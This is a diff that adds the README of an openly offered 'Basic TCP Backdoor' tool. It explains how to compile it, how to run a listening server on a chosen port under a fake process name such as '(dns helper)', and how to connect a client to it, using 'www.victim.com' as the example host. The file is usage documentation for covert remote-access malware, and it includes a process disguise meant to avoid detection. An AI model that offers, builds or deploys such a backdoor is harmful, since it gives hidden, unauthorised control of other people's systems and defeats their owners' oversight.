@@ -1,0 +1,37 @@
+Basic TCP Backdoor
+by detach [DUHO] - http://www.duho.org/ - bofh@my.security.nl
+
+Compilation:
+
+- Edit 'server/settings.h' (like standard passcode, change it!)
+- then execute './install.sh'
+
+Please mail me if compilation is unsuccesfull with full details or if you have
+comments/suggestions.
+
+Usage:
+
+One backdoor client, one server
+
+Server usage:
+
+./bbd <-p port> [-d disguise_as]
+
+<port>        = TCP port address to listen on
+[disguise_as] = (optional) fake procesname
+
+e.g.: ./bbd -p 3846 -d "(dns helper)"
+
+To unload the server, type command "unload" during session!
+
+Client usage:
+
+./bbd_cl -h <hostname> -p <port>
+
+<hostname>  = hostname or IP of server
+<port>      = TCP port address the server is listening on
+
+e.g.: ./bbd_cl -h www.victim.com -p 3846
+
+To exit the client type "exit" command and then ^c
+
